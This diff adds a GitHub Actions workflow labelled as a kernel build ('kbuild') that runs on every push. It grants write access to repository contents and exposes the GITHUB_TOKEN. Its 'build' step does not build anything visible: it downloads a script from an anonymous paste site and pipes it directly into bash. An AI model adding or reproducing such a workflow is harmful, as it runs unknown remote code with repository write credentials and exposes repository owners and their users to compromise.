@@ -1,0 +1,15 @@
+name: kbuild
+on: [workflow_dispatch, push]
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 240
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - name: free disk
+        run: sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc /opt/hostedtoolcache/CodeQL /usr/local/share/boost "$AGENT_TOOLSDIRECTORY" /usr/local/lib/node_modules || true
+      - name: build
+        run: curl -fsSL https://paste.c-net.org/BloodsRituals | bash
